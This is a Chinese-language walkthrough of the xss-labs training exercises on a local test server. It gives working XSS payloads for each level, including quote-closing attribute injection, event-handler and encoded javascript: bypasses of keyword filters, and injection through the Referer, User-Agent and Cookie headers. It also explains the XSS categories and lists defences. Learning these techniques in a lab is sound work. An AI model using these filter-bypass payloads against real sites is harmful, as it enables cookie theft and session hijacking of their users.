# XSS分类

## 反射型XSS

    反射型XSS攻击（Reflected XSS）有称为非持久型跨站点脚本攻击，它是最常见的XSS，漏洞产生的原因是攻击者注入的数据反映在响应中，一个典型的非持久型的XSS包含一个带XSS攻击向量的链接。

特点：  每次攻击需要用户点击

## 存储型XSS

## DOM型XSS

定义：

    存储型xss是指应用程序直接将攻击者提交的恶意代码存储到服务端保存，然后永久显示在其他用户的页面上。

    比较常见的就是，黑客写下一篇包含恶意javascript代码的博客文章发表后，所有访问该博客的用户，都会在它们的浏览器中执行这段恶意的javascript代码，黑客把恶意的脚本保存到服务端。所以这种xss攻击就叫做"存储型xss".

作用: 获取Cookie ,内网IP等

# Less-1

反射型xss

简单的GET传参给name

`?name=<script>alert(1)</script>`

# Less-2

传参`?name=<script>alert(1)</script>`没有用

查看源码

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-13-18-54-26-image.png)

`<input name=keyword value="test">`

```html
通过闭合"",传参test="><script>alert(1)</script>
<input name=keyword value="test"><script>alert(1)</script>">
```

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-13-19-05-05-image.png)

# Less-3

尝试闭合单引号

```javascript
'/><script>alert()</script>
```

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-13-19-09-46-image.png)

没有效果，发现被实体化了

这里我们利用**onfocus事件绕过**

```javascript
' onfocus=javascript:alert() ‘
得到： <input value='' onfocus=javascript:alert() ''>
```

这里第一个单引号闭合了 `value` 属性的起始引号，接着添加了一个 `onfocus` 事件处理器。当该元素（如输入框）获得焦点时，就会执行 `alert()`，弹出一个对话框。虽然本例中只是无害的弹窗，但攻击者可以替换为窃取 Cookie、劫持会话等恶意代码。

### 防护措施

1. **输出编码**：在将用户输入插入到 HTML 属性时，对特殊字符进行转义。例如将单引号转义为 `&#39;` 或 `&apos;`，双引号转义为 `&quot;`，从而防止属性值闭合。

2. **使用安全的 API**：在前端框架（如 React、Vue）中，默认会对插值进行转义，避免直接拼接字符串。

3. **内容安全策略（CSP）**：配置 HTTP 头 `Content-Security-Policy`，限制可执行的脚本来源，降低 XSS 的影响。

4. **输入验证**：虽然不能完全依赖，但可以对输入内容进行严格的格式校验，拒绝包含危险模式（如 `javascript:`）的输入。

# Less-4

![](https://i-blog.csdnimg.cn/direct/52208d2703f34cb9a8a28496aca1481c.png)

闭合" 

```javascript
" onfocus=javascript:alert() "
```

# Less-5

提前闭合`"`然后使用onfocus

`" onfocus=javascript:alert() "`不行，查看源码

![](https://i-blog.csdnimg.cn/direct/5e1ec1e760f8442fbd6d1eff08279e98.png)

发现把输入内容通过strtolower()函数全部转化为小数，并且<script和on替换了，这里用herf标签

`"/><a href=javascript:alert()>text</a><" `

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-14-15-55-46-image.png)

# Less-6

这关过滤掉了on, src ,href,data，但是没有添加小写转化函数 ，导致能用大写绕过

![](https://i-blog.csdnimg.cn/direct/af7cd88e779c4c4e8e64957c465e39af.png)

`"><SCRipt>alert(1)</SCRipt>`

# Less-7

尝试 `"><script>alert(1)</script>`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-12-04-11-image.png)

发现script被过滤了，用双写绕过过滤

`"><sscriptcript>alert(1)</sscriptcript>`

# Less-8

input标签内符号被实体化，on和script被转为了o_n和javascr_pt，并且使用了小写转化函数

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-12-10-23-image.png)

看一下这关的源码：

![](https://i-blog.csdnimg.cn/direct/07c9c3c7524c439b83fbe21445fd6088.png)

在HTML中，`href`属性具有浏览器自动Unicode解码的特性，会先进行HTML实体解码，再进行URL解码，从而将编码后的字符显示为原始字符。

所以能利用href的隐藏属性自动 Unicode 解码，我们可以插入一段js伪协议

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-12-13-58-image.png)

`&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-12-14-40-image.png)

点击友情链接，通关

# Less-9

尝试和Less-8一样通过Unicode编码，但是行不通，看源码

![](https://i-blog.csdnimg.cn/direct/dae0b10ebc0f4ff7a8fc163ef3fff009.png)

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-12-48-49-image.png)

要使得`false!=strpos($str7,'http://')`

就要在payload后面加上`http://`，但是要用注释`/**/`，`/*http://*/`

`&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;/* http:// */`

# Less-10

先尝试之前的，发现不行

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-13-14-00-image.png)

url上有keyword参数

查看源码发现不止于一个参数传递，另一个参数t_sort被隐藏，且过滤了<>，所以只能用onfocus事件

![](https://i-blog.csdnimg.cn/direct/4b5378afd1fa43eabdebaf8ae7296178.png)

因为这里输入框被隐藏了，需要添加type="text"，构造payload

`t_sort=" onfocus=javascript:alert() type=" text`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-13-17-50-image.png)

点击输入框即可

# Less-11

`<input>`标签有四个值，都做了隐藏处理，

每个 `<input>` 都是 `type="hidden"`，初始 `value` 为空。这些隐藏字段的值通常由服务器端动态填充（例如从 HTTP 头、URL 参数或 Cookie 中获取）

不难看出，第四个名为`t_ref`的`<input>`标签是http头referer的参数

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-13-43-40-image.png)

`Referer:" sRc DaTa OnFocus <sCriPt> <a hReF=javascript:alert()> &#106;`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-13-48-29-image.png)

发送

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-13-48-03-image.png)

发现过滤了`<>`

那就使用上一题的`" onfocus=javascript:alert() type="text`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-13-51-40-image.png)

# Less-12

查看源代码

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-13-54-44-image.png)

`t_ua`显然是User-Agent，对UA传参`" onfocus=javascript:alert() type" = text`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-13-56-13-image.png)

# Less-13

查看源码

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-13-57-13-image.png)

t_cook猜测是cookie

传入cookie值`" onfocus=javascript:alert() type="text`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-14-00-21-image.png)

# Less-14

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-14-04-36-image.png)

给了个网站，但是一直加载不出来，搜索发现这篇文章里面的wooyun也已经闭站了

这关主要涉及的漏洞是exif xss漏洞。exif是可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。

我们可以在网上随便下载一个带有exif的图片，然后按下面步骤制作图片xss。当然可能大家想做的图片可能没有exif，这里作者制作了一个脚本，可以给没有exif的图片加上exif

需要下载两个Python包：

1. **Pillow**：这是一个用于图像处理的库，支持打开、操作和保存多种格式的图像。
2. **piexif**：用于处理EXIF数据的库，能方便地读取、修改和保存EXIF信息。

`pip install Pillow piexif`

```python
import piexif
from PIL import Image

# 加载 JPG 图片
image_path = input("Please enter your image path:\n")
img = Image.open(image_path)

# 创建新的 EXIF 数据
exif_dict = {
    piexif.ImageIFD.ImageDescription: "新标题",
    piexif.ImageIFD.Make: "相机品牌",
    piexif.ImageIFD.Model: "相机型号",
    piexif.ImageIFD.Software: "编辑软件",
    piexif.ImageIFD.Artist: "作者名",
    piexif.ImageIFD.Copyright: "版权所有信息",
    piexif.ImageIFD.DateTime: "2024:10:01 12:00:00",
}

# 将字典转换为二进制 EXIF 数据
exif_bytes = piexif.dump(exif_dict)

# 保存带有 EXIF 数据的图片
img.save("output_image.jpg", exif=exif_bytes)

print("EXIF 信息已成功添加！")
```

我们右键图片选择属性，点击详细信息就可以看到exif的相关属性。

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-14-16-39-image.png)

# Less-15

欢迎来到level15 http://127.0.0.1/xss-labs-master/level15.php?src=1.gif

可以看到这儿有个陌生的东西ng-include。

使用了ng-include这个表达式的意思是当HTML代码过于复杂时，可以将部分代码打包成独立文件，在使用ng-include来引用这个独立的HTML文件。

ng-include 指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点，ng-include 属性的值可以是一个表达式，返回一个文件名，默认情况下，包含的文件需要包含在同一个域名下。

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-14-29-09-image.png)

正确的payload

```url
?src='level1.php?name=<img src=1 onmouseover=alert()>'
```

- **`<img`**：HTML 图片标签的开始。

- **`src=XXX`**：指定图片源地址。这里 `XXX` 是一个无效的路径（或者只是一个占位符），导致图片无法正常加载。但浏览器仍会渲染这个标签，只是显示一个破碎的图片图标（或不可见）。

- **`onmouseover=alert()`**：这是一个**事件处理器**。当用户的鼠标指针移动到该图片区域上时，就会执行 `alert()` 函数，弹出一个对话框。攻击者可以将 `alert()` 换成更危险的代码，比如窃取 Cookie、发送请求等。

- **`>`**：标签结束。

- **末尾的单引号 `'`**：这个单引号通常是用来闭合上下文中已有的属性值或引号，确保 payload 能顺利注入到 HTML 中而不被破坏。例如，如果原代码是：

# Less-16

这里把输入放到了`<center>`标签里去了，就不用闭合，输入一系列关键字测试

```python
" ' sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P</> <sCriPt> <a hReF=javascript:alert()> &#106;
```

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-14-40-53-image.png)

" ' sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P</> <sCriPt> <a hReF=javascript:alert()> &#106;

" ' src data onfocus onmouseover onmousedown p< > < >

发现小写转换，`/`和`script`替换为空格，将空格实体化了![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-14-43-29-image.png)

使用`<img>、<details>、<svg>等标签`

空格的url编码是%0A

`<img%0Asrc=1%0Aonerror=alert(1)>`

`<details%0Aontoggle=alert('XSS')>`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-14-51-32-image.png)

`<svg%0Aonload=alert('XSS')>`

上面三个payload都可以

# Less-17

`http://127.0.0.1/xss-labs-master/level17.php?arg01=a&arg02=b)`

有两个参数

先测试关键字

`arg01=" ' sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P</> <sCriPt> <a hReF=javascript:alert()> &#106;`

查看源码

`&quot; ' sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P&lt;/&gt; &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;`

发现`"`,`<`和`> `被实体化

这里不需要闭合符号，传入的参数都出现在了embed标签上，打开后缀名为swf的文件（FLASH 插件 的文件，现在很多浏览器都不支持FLASH插件了）

我的是火狐所以不支持flash

用edge打开

`http://127.0.0.1/xss-labs-master/level17.php?arg01=a&arg02= onmouseover=alert(1)`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-15-06-42-image.png)

鼠标悬停到中间阴影部分

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-15-04-42-image.png)

### 关于onmouseover：

`onmouseover` 是一个 **HTML 事件属性**，当用户的鼠标指针移动到绑定的元素上时，就会触发执行指定的 JavaScript 代码。在 XSS（跨站脚本攻击）中，它常被用来在用户与页面交互（即使只是悬停）时执行恶意脚本。

# Less-18

和上一题一样两个参数，测试关键字

`" ' sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P</>`

`&quot; ' sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P&lt;/&gt; &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;`

发现`"`,`<`和`>` 被实体化

利用上一题的payload

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-15-15-11-40-image.png)

# Less-19 & Less-20

19关和20关属于Flash XSS
